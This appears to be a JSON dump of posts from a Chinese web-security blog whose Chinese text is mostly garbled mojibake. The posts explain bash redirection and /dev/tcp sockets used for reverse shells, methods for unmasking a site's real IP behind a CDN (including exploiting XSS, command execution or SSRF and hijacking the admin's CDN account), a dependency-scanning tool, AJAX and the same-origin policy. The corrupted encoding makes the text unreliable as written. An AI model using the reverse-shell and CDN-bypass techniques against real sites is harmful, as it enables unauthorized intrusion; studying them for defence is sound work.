(file descriptor 2) to be appended to the file whose name is the expansion of word. The format for appending standard output and standard error is: &amp;&gt;&gt;word This is semantically equivalent to çœ‹bashçš„æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘äº†è·Ÿ &gt;word 2&gt;&amp;1 çš„æ•ˆæœæ˜¯ä¸€è‡´çš„ å½“ç„¶æˆ‘ä»¬ç”¨ &amp;&gt; ä¹Ÿæ˜¯å¯ä»¥çš„ 0x003 å…³äº0&gt;&amp;1 0&gt;1æ˜¯å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ–‡ä»¶åä¸º1çš„æ–‡ä»¶ï¼Œä¸å­˜åœ¨å°±åˆ›å»ºæ‰€ä»¥ä¸ºäº†åŒºåˆ«ï¼Œé‚£å°±åœ¨1å‰é¢åŠ ä¸ª&amp;æ¥è¡¨ç¤ºæ ‡å‡†è¾“å‡ºã€‚ 0&gt;&amp;1 0x004 å…³äº /dev/tcp/host/port æˆ‘ä»¬çŸ¥é“linuxä¸€åˆ‡çš†æ–‡ä»¶ï¼Œä½†æ˜¯å…¶å®è¿™ä¸ªæ–‡ä»¶è‚¯å®šæ˜¯ä¸å­˜åœ¨çš„ æˆ‘ä»¬å¯ä»¥ä»manæ–‡æ¡£ä¸­çœ‹åˆ° 1234567root@kali:~# man bash | grep &quot;/dev/tcp&quot; -A 5 /dev/tcp/host/port If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open the corresponding TCP socket. /dev/udp/host/port If host is a valid hostname or Internet address, and port é‚£ä¹ˆè¿™ä¸ªæ˜¯åœ¨ä¸»æœºåã€ipåœ°å€ä»¥åŠç«¯å£æœ‰æ•ˆçš„æƒ…å†µï¼Œä¼šæ‰“å¼€ä¸€ä¸ªTCPçš„å¥—æ¥å­—ï¼Œè¿æ¥å¯¹åº”ä¸»æœºçš„å¯¹åº”ç«¯å£","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.vkxss.top/categories/Linux/"}],"tags":[{"name":"åå¼¹Shell","slug":"åå¼¹Shell","permalink":"http://www.vkxss.top/tags/åå¼¹Shell/"}]},{"title":"ç»•CDNï¼Œç½‘ç«™çœŸå®IPè®°å½•","slug":"æ¸—é€æµ‹è¯•-ç»•CDNï¼Œç½‘ç«™çœŸå®IPè®°å½•","date":"2019-04-18T04:25:40.000Z","updated":"2019-12-12T08:08:26.115Z","comments":true,"path":"2019/04/18/æ¸—é€æµ‹è¯•-ç»•CDNï¼Œç½‘ç«™çœŸå®IPè®°å½•/","link":"","permalink":"http://www.vkxss.top/2019/04/18/æ¸—é€æµ‹è¯•-ç»•CDNï¼Œç½‘ç«™çœŸå®IPè®°å½•/","excerpt":"","text":"### 0x01 ç»•CDNï¼ŒéªŒè¯æ˜¯å¦å­˜åœ¨CDNæ–¹æ³•1 è¶…çº§ ping ï¼ŒæŸ¥çœ‹å¯¹åº” IP åœ°å€æ˜¯å¦å”¯ä¸€ï¼Œå¦‚æœä¸å”¯ä¸€å¤§æ¦‚ç‡ä½¿ç”¨äº†CDNï¼Œ pingä¸€ä¸ªç«™ï¼Œå“åº”å¤šä¸ªIPï¼Œè‚¯å®šç”¨äº†CDNï¼Œå¤šåœ° Ping ç½‘ç«™æœ‰å¾ˆå¤šï¼Œå¦‚ä¸‹ï¼Œæ ¹æ®å“åº”åŒ…åˆ¤æ–­æ˜¯å¦å­˜åœ¨CDN 123http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ æ–¹æ³•2 nslookup è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœè¿”å›åŸŸåè§£æå¯¹åº”å¤šä¸ª IP åœ°å€å¤§æ¦‚ç‡ä½¿ç”¨äº† CDNã€‚ 12345678910111213141516171819202122232425262728 æ¯”å¦‚ï¼š &gt; www.163.com æœåŠ¡å™¨: public1.114dns.com Address: 114.114.114.114 éæƒå¨åº”ç­”: åç§°: 163.xdwscache.ourglb0.com Addresses: 58.223.164.86 125.75.32.252 Aliases: www.163.com www.163.com.lxdns.com åœ¨æ¯”å¦‚ï¼š æ—  CDN çš„ç¤ºä¾‹ï¼š &gt; je2se.com æœåŠ¡å™¨: public1.114dns.com Address: 114.114.114.114 éæƒå¨åº”ç­”: åç§°: je2se.com Address: 192.168.1.1 ``` ##### æ–¹æ³•3- è¿˜æœ‰ä½¿ç”¨å„ç§å·¥å…·å¸®åŠ©æ£€æµ‹ç›®æ ‡ç½‘ç«™æ˜¯å¦ä½¿ç”¨äº† CDNï¼Œ - æ¯”å¦‚ï¼š http://www.cdnplanet.com/tools/cdnfinder/ http://www.ipip.net/ip.html 123456 - ç»•è¿‡ CDN æŸ¥æ‰¾ç½‘ç«™çœŸå® IP - æŸ¥è¯¢å†å²DNSè®°å½• - æŸ¥çœ‹ IP ä¸ åŸŸåç»‘å®šçš„å†å²è®°å½•ï¼Œå¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨ CDN å‰çš„è®°å½•ï¼Œ - æ¯”å¦‚ï¼š https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= http://viewdns.info/ æŸ¥è¯¢å­åŸŸå å¾ˆå¤šç«™é•¿ä¹Ÿè®¸åªä¼šå¯¹ä¸»ç«™æˆ–è€…æµé‡å¤§çš„å­ç«™ç‚¹åŠ  CDNï¼Œå¾ˆå¤šå°ç«™ç‚¹åˆè·Ÿä¸»ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨æˆ–è€…åŒä¸€ä¸ªCæ®µå†…ï¼Œæ­¤æ—¶å°±å¯ä»¥é€šè¿‡å­åŸŸåæŸ¥è¯¢å¯¹åº”çš„ IP æ¥è¾…åŠ©æŸ¥æ‰¾ç½‘ç«™çš„çœŸå®IPã€‚ åˆ©ç”¨ç½‘ç«™æ¼æ´ /æ»‘ç¨½ ï¼Œåˆ©ç”¨æ¼æ´ç›®æ ‡æœåŠ¡å™¨ä¸»åŠ¨æ¥è¿æ¥æˆ‘ä»¬ï¼Œè¿™æ ·å°±èƒ½çŸ¥é“çœŸå®IPï¼Œæ¯”å¦‚XSSç›²æ‰“ï¼Œå‘½ä»¤æ‰§è¡Œåå¼¹shellï¼ŒSSRFç­‰ç­‰ã€‚ æœåŠ¡å™¨åˆæ³•æœåŠ¡ä¸»åŠ¨è¿æ¥æˆ‘ä»¬ ä¸€æ ·çš„æ€è·¯å°±æ˜¯è®©æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æˆ‘ä»¬å‘Šè¯‰æˆ‘ä»¬å®ƒçš„IPï¼Œä¸è¿‡ä½¿ç”¨çš„æ˜¯åˆæ³•çš„æœåŠ¡ï¼Œå¦‚RSSé‚®ä»¶è®¢é˜…ï¼Œå¾ˆå¤šç½‘ç«™éƒ½è‡ªå¸¦ sendmailï¼Œä¼šå‘é‚®ä»¶ç»™æˆ‘ä»¬ï¼Œæ­¤æ—¶æŸ¥çœ‹é‚®ä»¶æºç é‡Œé¢å°±ä¼šåŒ…å«æœåŠ¡å™¨çš„çœŸå® IP äº†ã€‚ ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå å›½å†…å¾ˆå¤š CDN å‚å•†å› ä¸ºå„ç§åŸå› åªåšäº†å›½å†…çš„çº¿è·¯ï¼Œè€Œé’ˆå¯¹å›½å¤–çš„çº¿è·¯å¯èƒ½å‡ ä¹æ²¡æœ‰ï¼Œæ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨å›½å¤–çš„ä¸»æœºç›´æ¥è®¿é—®å¯èƒ½å°±èƒ½è·å–åˆ°çœŸå®IPã€‚ ç›®æ ‡æ•æ„Ÿæ–‡ä»¶æ³„éœ² ä¹Ÿè®¸ç›®æ ‡æœåŠ¡å™¨ä¸Šå­˜åœ¨ä¸€äº›æ³„éœ²çš„æ•æ„Ÿæ–‡ä»¶ä¸­ä¼šå‘Šè¯‰æˆ‘ä»¬ç½‘ç«™çš„IPï¼Œå¦å¤–å°±æ˜¯å¦‚ phpinfoä¹‹ç±»çš„æ¢é’ˆäº†ã€‚ ä» CDN å…¥æ‰‹ æ— è®ºæ˜¯ç”¨ç¤¾å·¥è¿˜æ˜¯å…¶ä»–æ‰‹æ®µï¼Œåæ­£æ˜¯æ‹¿åˆ°äº†ç›®æ ‡ç½‘ç«™ç®¡ç†å‘˜åœ¨CDNçš„è´¦å·äº†ï¼Œæ­¤æ—¶å°±å¯ä»¥è‡ªå·±åœ¨CDNçš„é…ç½®ä¸­æ‰¾åˆ°ç½‘ç«™çš„çœŸå®IPäº†ã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"Jarç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´æ£€æŸ¥å·¥å…·","slug":"Jarç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´æ£€æŸ¥å·¥å…·","date":"2019-02-22T07:30:08.000Z","updated":"2019-12-15T15:34:13.656Z","comments":true,"path":"2019/02/22/Jarç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´æ£€æŸ¥å·¥å…·/","link":"","permalink":"http://www.vkxss.top/2019/02/22/Jarç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´æ£€æŸ¥å·¥å…·/","excerpt":"","text":"0x00 å·¥å…·ä»‹ç» dependency-checkæ˜¯ä¸€æ¬¾æ ¹æ®é¡¹ç›®ä¾èµ–æ¥æ£€æŸ¥æ¼æ´çš„ç™½ç›’å®¡è®¡å·¥å…·ã€‚ä»–æ ¹æ®é¡¹ç›®ä¸­çš„ä¾èµ–åº“ï¼Œæœé›†ä¾èµ–çš„ç‰ˆæœ¬ï¼Œå‚å•†ç­‰ä¿¡æ¯ï¼Œç„¶ååŒ¹é…NVDæ¼æ´åº“ï¼Œå¯¹æ¯”å…¶ä¸­çš„CPEæ¥ç¡®å®šæ­¤ç‰ˆæœ¬çš„ä¾èµ–åŒ…æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚ä»–è™½ç„¶æœ€ä¸»è¦æ˜¯ç”¨æ¥æ£€æŸ¥javaé¡¹ç›®çš„ä¾èµ–ï¼Œä½†æ˜¯å¯¹äºjs,c/c++,pythonï¼Œå®ƒä¹Ÿæ˜¯å…·æœ‰ä¸€å®šçš„æ£€æŸ¥èƒ½åŠ›ã€‚ å®ƒæ”¯æŒå¤šç§ä½¿ç”¨æ–¹å¼ï¼Œå„æœ‰ä¼˜ç¼ºç‚¹ã€‚æ— è®ºæ˜¯jaråŒ…ï¼Œè¿˜æ˜¯ç›®å½•ï¼Œæˆ–è€…å‹ç¼©æ–‡ä»¶ï¼Œä»–éƒ½èƒ½è‡ªåŠ¨è¯†åˆ«ã€‚ 0x01 å®‰è£…ä¸è¿è¡Œ Dependency Checkå®˜ç½‘ï¼šhttps://www.owasp.org/index.php/OWASP_Dependency_Check Dependency Checkå®˜æ–¹æ–‡æ¡£ï¼šhttps://jeremylong.github.io/DependencyCheck/index.html Dependency Checkæœ‰ä¸‰ç§ä½¿ç”¨æ–¹å¼ï¼š ä»å‘½ä»¤è¡Œä½¿ç”¨ï¼šæ­¤æ—¶Dependency Checkä½œä¸ºä¸€ä¸ªå•ç‹¬çš„è½¯ä»¶ï¼Œä¸é¡¹ç›®æ— å…³ï¼Œä½¿ç”¨æ—¶åªéœ€æŒ‡å®šéœ€è¦æ‰«æçš„é¡¹ç›®ä½ç½®å³å¯ã€‚åœ¨ä¸šåŠ¡ä¸Šçº¿æµç¨‹ä¸­æ¨èä½¿ç”¨æ­¤æ–¹å¼ ä½œä¸ºæ’ä»¶åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ï¼šæ­¤æ—¶éœ€è¦åœ¨é¡¹ç›®çš„é…ç½®æ–‡ä»¶ä¸­åšç›¸å…³å†…å®¹æ·»åŠ ï¼Œåªå¯¹å½“å‰é¡¹ç›®æœ‰æ•ˆã€‚åˆ«çš„é¡¹ç›®éœ€è¦ä½¿ç”¨æ—¶ï¼Œéœ€è¦é‡æ–°ä¿®æ”¹é…ç½®æ–‡ä»¶ ä½œä¸ºAnt Taskä½¿ç”¨ï¼šè¿™ç§æ–¹å¼çš„ä½¿ç”¨ä»‹äºä»¥ä¸Šä¸¤è€…ä¹‹é—´ï¼Œå¯ä»¥åœ¨å¤šä¸ªé¡¹ç›®ä¸­ä½¿ç”¨ï¼Œä½†æ˜¯éœ€è¦å®‰è£…ï¼Œå¹¶ä¸”éœ€è¦åœ¨é¡¹ç›®çš„build.xmlä¸­æ·»åŠ ç›¸å…³é…ç½®ã€‚ ä¸‹è½½ä½¿ç”¨è¯´æ˜ï¼š ä»å‘½ä»¤è¡Œä½¿ç”¨æ—¶Dependency Checkä½œä¸ºä¸€ä¸ªå•ç‹¬çš„è½¯ä»¶ï¼Œéœ€è¦ä»å®˜ç½‘ä¸‹è½½ã€‚ å®˜ç½‘å³ä¾§Quick Downloadç›®å½•ä¸‹é€‰æ‹©Command Lineå³å¯ã€‚ ä¸‹è½½åè§£å‹å³å¯ä½¿ç”¨ã€‚ å¦‚æœæ˜¯windowså¹³å°ï¼Œè¿è¡Œbinç›®å½•ä¸‹dependency-check.batï¼› å¦‚æœæ˜¯linuxï¼Œè¿è¡Œdependency-check.shï¼› å¦‚æœæ˜¯macå¹³å°ï¼Œä½¿ç”¨brew install dependency-checkå³å¯å®‰è£…ã€‚ æ³¨æ„ï¼šç¬¬ä¸€æ¬¡æ‰«æçš„æ—¶å€™ä¼šéœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´ã€‚å› ä¸ºDependency Checkéœ€è¦å°†ä»NVDä¸‹è½½æ•°æ®åº“ï¼Œåˆ™å¯èƒ½éœ€è¦èŠ±ååˆ†é’Ÿç”šè‡³äºŒååˆ†é’Ÿã€‚åœ¨è¿™ä¹‹åï¼Œåªè¦ä¸¤æ¬¡æ‰«æçš„é—´éš”æ—¶é—´ä¸è¶…è¿‡ä¸ƒå¤©ï¼Œå°±åªéœ€è¦ç»´æŠ¤ä¸€ä¸ªå¾ˆå°çš„xmlåˆ—è¡¨ï¼Œå®ƒä¼šåœ¨æ¯æ¬¡å¯åŠ¨æ‰«æçš„æ—¶å€™è‡ªåŠ¨æ›´æ–°ï¼Œå¤§çº¦åªéœ€è¦ä¸€åˆ†é’Ÿå·¦å³ã€‚ å¦‚ä½•ä½¿ç”¨ï¼š windowsä½¿ç”¨: dependency-check.bat â€“project â€œMy App Nameâ€ â€“scan â€œc:\\java\\application\\libâ€ å‚æ•°è¯´æ˜ï¼š projectç”¨äºæŒ‡å®šè¿™ä¸ªæ‰«æé¡¹ç›®çš„åå­—ï¼ˆä¸æ˜¯è¦æ‰«æçš„é¡¹ç›®ï¼Œè€Œæ˜¯æ‰«æè¿™ä¸ªä»»åŠ¡çš„é¡¹ç›®åå­—ï¼Œå¯ä»¥éšä¾¿æŒ‡å®šï¼‰ scanæŒ‡å®šè¦æ‰«æçš„å‹ç¼©æ–‡ä»¶æˆ–è€…ç›®å½•ã€‚Linuxå¹³å°ç±»ä¼¼ï¼Œåªæ˜¯æŠŠ.batæ¢æˆ.shã€‚ç¬¬ä¸€æ¬¡ä½¿ç”¨ä¼šå¾ˆæ…¢ï¼Œå› ä¸ºè¦ä¸‹è½½ç›¸åº”çš„NVDåº“ã€‚","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç å®¡è®¡","permalink":"http://www.vkxss.top/tags/Javaä»£ç å®¡è®¡/"}]},{"title":"ä»€ä¹ˆæ˜¯AJAX","slug":"å‰ç«¯å®‰å…¨-ä»€ä¹ˆæ˜¯AJAX","date":"2019-02-07T07:30:08.000Z","updated":"2019-10-15T05:18:40.231Z","comments":true,"path":"2019/02/07/å‰ç«¯å®‰å…¨-ä»€ä¹ˆæ˜¯AJAX/","link":"","permalink":"http://www.vkxss.top/2019/02/07/å‰ç«¯å®‰å…¨-ä»€ä¹ˆæ˜¯AJAX/","excerpt":"","text":"ä¸€ã€ä»€ä¹ˆæ˜¯Ajax? AJAXå…¨ç§°ä¸ºâ€œAsynchronous JavaScript and XMLâ€(å¼‚æ­¥JavaScriptå’ŒXML),æ˜¯ä¸€ç§åˆ›å»ºäº¤äº’å¼ç½‘é¡µåº”ç”¨çš„ç½‘é¡µå¼€å‘æŠ€æœ¯ Ajaxæ˜¯ä¸€ç§æŠ€æœ¯æ–¹æ¡ˆï¼Œä½†å¹¶ä¸æ˜¯ä¸€ç§æ–°æŠ€æœ¯ã€‚å®ƒä¾èµ–ç°æœ‰çš„CSS/HTML/JavaScriptï¼Œè€Œå…¶ä¸­æœ€æ ¸å¿ƒçš„ä¾èµ–æ˜¯æµè§ˆå™¨æä¾›çš„XMLHttpRequestå¯¹è±¡ï¼Œæ˜¯è¿™ä¸ªå¯¹è±¡ä½¿å¾—æµè§ˆå™¨å¯ä»¥å‘å‡ºHTTPè¯·æ±‚ä¸æ¥æ”¶HTTPå“åº”ã€‚å®ç°äº†åœ¨é¡µé¢ä¸åˆ·æ–°ä¸ªæƒ…å†µä¸‹å’ŒæœåŠ¡å™¨è¿›è¡Œæ•°æ®äº¤äº’ã€‚ è¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸é‡æ–°åŠ è½½æ•´ä¸ªç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯¹ç½‘é¡µçš„æŸéƒ¨åˆ†è¿›è¡Œæ›´æ–°ã€‚ä¼ ç»Ÿçš„ç½‘é¡µï¼ˆä¸ä½¿ç”¨ AJAXï¼‰å¦‚æœéœ€è¦æ›´æ–°å†…å®¹ï¼Œå¿…éœ€é‡è½½æ•´ä¸ªç½‘é¡µé¢ã€‚æœ‰å¾ˆå¤šä½¿ç”¨ AJAX çš„åº”ç”¨ç¨‹åºæ¡ˆä¾‹ï¼šæ–°æµªå¾®åšã€Google åœ°å›¾ã€å¼€å¿ƒç½‘ç­‰ç­‰ã€‚ äºŒã€å¦‚ä½•å®ç°Ajaxï¼Ÿ (1)åˆ›å»ºXMLHttpRequestå¯¹è±¡,ä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼‚æ­¥è°ƒç”¨å¯¹è±¡. (2)åˆ›å»ºä¸€ä¸ªæ–°çš„HTTPè¯·æ±‚,å¹¶æŒ‡å®šè¯¥HTTPè¯·æ±‚çš„æ–¹æ³•ã€URLåŠéªŒè¯ä¿¡æ¯. (3)è®¾ç½®å“åº”HTTPè¯·æ±‚çŠ¶æ€å˜åŒ–çš„å‡½æ•°. (4)å‘é€HTTPè¯·æ±‚. (5)è·å–å¼‚æ­¥è°ƒç”¨è¿”å›çš„æ•°æ®. (6)ä½¿ç”¨JavaScriptå’ŒDOMå®ç°å±€éƒ¨åˆ·æ–°. 0x01 Demo user.json 1234&#123; &quot;name&quot;:&quot;VK&quot;, &quot;age&quot;:&quot;25&quot;&#125; ajax.html 0x02 æ¼”ç¤º ç½‘ç«™Aè·å–ç½‘ç«™Bçš„ç”¨æˆ·æ•°æ®ï¼š ç½‘ç«™Aï¼šhttp://vkduang.com/AJAX/ajax.html ç½‘ç«™Bï¼šhttp://vkkuayu.com:8000/user.json ä½ ä¼šå‘ç°consoleæŠ¥å‡ºäº†å¦‚ä¸‹çš„é”™è¯¯; å¾ˆæ˜æ˜¾è¯·æ±‚æ˜¯å—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶ã€‚ 0x03 å“ªäº›èµ„æºæ˜¯é»˜è®¤å¯ä»¥è·¨åŸŸçš„ ä¸Šé¢å®šä¹‰æåˆ°äº†â€å—é™åˆ¶â€, ä¹Ÿå°±æ˜¯è¯´ä¸æ˜¯æ‰€æœ‰çš„è·¨åŸŸèµ„æºéœ€è¦CORSæœºåˆ¶ã€‚ æ€è€ƒğŸ¤”","categories":[{"name":"å‰ç«¯å®‰å…¨","slug":"å‰ç«¯å®‰å…¨","permalink":"http://www.vkxss.top/categories/å‰ç«¯å®‰å…¨/"}],"tags":[{"name":"å‰ç«¯çŸ¥è¯†","slug":"å‰ç«¯çŸ¥è¯†","permalink":"http://www.vkxss.top/tags/å‰ç«¯çŸ¥è¯†/"}]},{"title":"ç†è§£åŒæºç­–ç•¥æ€»ç»“","slug":"å‰ç«¯å®‰å…¨-ç†è§£åŒæºç­–ç•¥æ€»ç»“","date":"2019-02-06T07:30:08.000Z","updated":"2020-02-08T16:45:46.952Z","comments":true,"path":"2019/02/06/å‰ç«¯å®‰å…¨-ç†è§£åŒæºç­–ç•¥æ€»ç»“/","link":"","permalink":"http://www.vkxss.top/2019/02/06/å‰ç«¯å®‰å…¨-ç†è§£åŒæºç­–ç•¥æ€»ç»“/","excerpt":"","text":"0x01 èƒŒæ™¯ 0x02 é¦–å…ˆè¯´è¯´ä¸ºä»€ä¹ˆå­˜åœ¨åŒæºç­–ç•¥ 0x03 ä¸¾ä¸ªä¾‹å­ 0x04 åŒæºç­–ç•¥çš„é™åˆ¶èŒƒå›´ 0x05 å…è®¸è·¨åŸŸåŠ è½½çš„ä¸‰ä¸ªæ ‡ç­¾ 0x06 ç»•è¿‡è·¨åŸŸ 0x07 sopæ— æ³•é˜²å¾¡csrf 0x08 SOP ä¸ ajax 0x01 èƒŒæ™¯ å½“æˆ‘ä»¬å¯èƒ½è§‚å¯Ÿåˆ°äº†ä¸å°‘ç½‘ç«™çš„ä¸€äº›æ¥å£ä¿¡æ¯ã€‚å‘ç°æµè§ˆå™¨ä¸ºäº†ä¿è¯ç”¨æˆ·éšç§ä»¥åŠå…¶å®ƒå› ç´ è€ƒè™‘ï¼Œå¯¹äºç½‘ç»œæ¥å£çš„è°ƒç”¨æœ‰ä¸€å±‚å±éšœï¼Œè¿™å±‚å±éšœç§°ä¸ºåŒæºç­–ç•¥ã€‚é‚£ä¹ˆä»Šå¤©æˆ‘ä»¬å°±æ¥å­¦ä¹ ä¸‹è¿™ä¸ªåŒæºç­–ç•¥ï¼Œå¸Œæœ›èƒ½æå‡å¤§å®¶å¯¹äºæ¥å£çš„æµ‹è¯•å’Œåˆ©ç”¨æ°´å¹³ã€‚ 0x02 é¦–å…ˆè¯´è¯´ä¸ºä»€ä¹ˆå­˜åœ¨åŒæºç­–ç•¥ æˆ‘ä»¬çŸ¥é“JavaScriptå¯ä»¥æ“ä½œhtmlï¼Œå¯ä»¥å‘å‡ºè¯·æ±‚ï¼Œä¹Ÿå¯ä»¥ç”¨iframeåŠ è½½åˆ«çš„ç½‘ç«™ã€‚é‚£ä¹ˆè¯•æƒ³ä¸€ä¸‹ï¼Œä½ ç™»é™†äº†ä¸€ä¸ªè´­ç‰©ç½‘ç«™æ¯”å¦‚æŸå®ï¼Œæ¥ç€å»è®¿é—®äº†VKâ€™Blogã€‚å¦‚æœVKâ€™Blogåˆ©ç”¨JavaScriptç»™æŸå®çš„æ”¶è´§åœ°å€urlå‘èµ·äº†è¯·æ±‚ï¼Œä»åŸåˆ™ä¸Šè®²ï¼Œè¿™ä¸ªè¯·æ±‚ä¸ä¼šæˆåŠŸï¼Œå¦åˆ™ä½ çš„éšç§å°±æ³„éœ²äº†ã€‚é‚£ä¹ˆæ§åˆ¶è¿™ä¸ªè¯·æ±‚çš„æˆåŠŸä¸å¦ï¼Œå°±å«åŒæºç­–ç•¥ã€‚ æ€»ä¹‹ï¼ŒåŒæºç­–ç•¥çš„è§„å®šå¯ä»¥æ¦‚æ‹¬æˆï¼šä¸åŒåŸŸçš„å®¢æˆ·ç«¯è„šæœ¬åœ¨æ²¡æ˜ç¡®æˆæƒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½è¯»å†™å¯¹æ–¹çš„èµ„æºã€‚ 0x03 ä¸¾ä¸ªä¾‹å­ å‡è®¾æœ‰ä»¥ä¸‹é¡µé¢ï¼Œæ¯”è¾ƒ A é¡µé¢ä¸å…¶å®ƒé¡µé¢æ˜¯å¦åŒæºï½ 12345Aï¼šhttp://vk.com/a.html Bï¼šhttp://vk.com/b.html Cï¼šhttps://vk.com /c.html Dï¼šhttp://test.vk.com/d.html Eï¼šhttp://vk.com:8081/e.html æ ¹æ®å®šä¹‰ï¼Œå¯ä»¥çŸ¥é“ A å’Œ B åŒæºï¼Œè€Œ A å’Œ Cã€Dã€E ä¸åŒæºã€‚Aã€B é¡µé¢åŒæºæ˜¯å› ä¸ºå…¶åè®®ï¼ˆéƒ½æ˜¯ httpï¼‰ã€åŸŸåï¼ˆéƒ½æ˜¯ xys.ttsyï¼‰å’Œç«¯å£ï¼ˆéƒ½æ˜¯ 80ï¼‰éƒ½ç›¸åŒï¼›è€Œ A ä¸ Cã€Dã€E ä¸åŒæºï¼Œæ˜¯å› ä¸º A å’Œ C ä¸åŒåè®®ï¼ˆhttp å’Œ httpsï¼‰ï¼ŒA å’Œ D ä¸åŒåŸŸåï¼ˆvk.com å’Œ test.vk.comï¼‰ï¼ŒA å’Œ E ä¸åŒç«¯å£ï¼ˆ80 å’Œ 8081ï¼‰ ã€‚ æ³¨æ„ åŒæºç­–ç•¥è¦æ±‚ä¸‰åŒ, å³: åŒåŸŸ, åŒåè®®, åŒç«¯å£. åŒåŸŸå³hostç›¸åŒ, é¡¶çº§åŸŸå, ä¸€çº§åŸŸå, äºŒçº§åŸŸå, ä¸‰çº§åŸŸåç­‰å¿…é¡»ç›¸åŒ, ä¸”åŸŸåä¸èƒ½ä¸ ip å¯¹åº”; é¡¶çº§åŸŸåï¼š.cn ä¸€çº§åŸŸåï¼švk.cn äºŒçº§åŸŸåï¼šwww.vk.cn ä¸‰çº§åŸŸåï¼šxxx.www.vk.cn åŒåè®®è¦æ±‚, httpä¸httpsåè®®å¿…é¡»ä¿æŒä¸€è‡´; åŒç«¯å£è¦æ±‚, ç«¯å£å·å¿…é¡»ç›¸åŒ. IEæœ‰äº›ä¾‹å¤–, å®ƒä»…ä»…åªæ˜¯éªŒè¯ä¸»æœºåä»¥åŠè®¿é—®åè®®ï¼Œè€Œå¿½ç•¥äº†ç«¯å£å·. è¿™é‡Œéœ€è¦æ¾„æ¸…ä¸€ä¸ªæ¦‚å¿µ, æ‰€è°“çš„åŸŸ, è·Ÿ js ç­‰èµ„æºçš„å­˜æ”¾æœåŠ¡å™¨æ²¡æœ‰å…³ç³», æ¯”å¦‚ä½ åˆ° baidu.com ä½¿ç”¨ script æ ‡ç­¾è¯·æ±‚äº† google.com ä¸‹çš„js, é‚£ä¹ˆè¯¥ js æ‰€åœ¨åŸŸæ˜¯ baidu.com, è€Œä¸æ˜¯ google.com. æ¢è¨€ä¹‹, å®ƒèƒ½æ“ä½œbaidu.comçš„é¡µé¢å¯¹è±¡, å´ä¸èƒ½æ“ä½œgoogle.comçš„é¡µé¢å¯¹è±¡. 0x04 åŒæºç­–ç•¥çš„é™åˆ¶èŒƒå›´ åŒæºç­–ç•¥ä¸‹çš„webä¸–ç•Œ, åŸŸçš„å£å’é«˜ç­‘, ä»è€Œä¿è¯å„ä¸ªç½‘é¡µç›¸äº’ç‹¬ç«‹, äº’ç›¸ä¹‹é—´ä¸èƒ½ç›´æ¥è®¿é—®, iframe, ajax ç­‰å‡å—å…¶é™åˆ¶, ä½†æ˜¯æœ‰ä¸‰ä¸ªæ ‡ç­¾æ˜¯å…è®¸è·¨åŸŸåŠ è½½èµ„æºçš„ã€‚ Iframeé™åˆ¶ å¯ä»¥è®¿é—®åŒåŸŸèµ„æº, å¯è¯»å†™; è®¿é—®è·¨åŸŸé¡µé¢æ—¶, åªè¯». Ajaxé™åˆ¶ Ajax çš„é™åˆ¶æ¯” iframe é™åˆ¶æ›´ä¸¥. åŒåŸŸèµ„æºå¯è¯»å†™; è·¨åŸŸè¯·æ±‚ä¼šç›´æ¥è¢«æµè§ˆå™¨æ‹¦æˆª.(chromeä¸‹è·¨åŸŸè¯·æ±‚ä¸ä¼šå‘èµ·, å…¶ä»–æµè§ˆå™¨ä¸€èˆ¬æ˜¯å¯å‘é€è·¨åŸŸè¯·æ±‚, ä½†å“åº”è¢«æµè§ˆå™¨æ‹¦æˆª) Cookieé™åˆ¶ åªæœ‰åŒæºçš„ç½‘é¡µæ‰èƒ½å…±äº« ä½†æ˜¯ï¼Œä¸¤ä¸ªç½‘é¡µä¸€çº§åŸŸåç›¸åŒï¼Œåªæ˜¯äºŒçº§åŸŸåä¸åŒï¼Œæµè§ˆå™¨å…è®¸é€šè¿‡è®¾ç½®document.domainå…±äº« Cookieã€‚ ä¸¾ä¾‹æ¥è¯´ï¼ŒAç½‘é¡µæ˜¯http://w1.example.com/a.htmlï¼ŒBç½‘é¡µæ˜¯http://w2.example.com/b.htmlï¼Œé‚£ä¹ˆåªè¦è®¾ç½®ç›¸åŒçš„document.domainï¼Œä¸¤ä¸ªç½‘é¡µå°±å¯ä»¥å…±äº«Cookieã€‚ document.domain = â€˜example.comâ€™;ç°åœ¨ï¼ŒAç½‘é¡µé€šè¿‡è„šæœ¬è®¾ç½®ä¸€ä¸ª Cookieã€‚document.cookie = â€œtest1=helloâ€; Bç½‘é¡µå°±å¯ä»¥è¯»åˆ°è¿™ä¸ª Cookieã€‚var allCookie = document.cookie; æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•åªé€‚ç”¨äº Cookie å’Œ iframe çª—å£ï¼ŒLocalStorage å’Œ IndexDB æ— 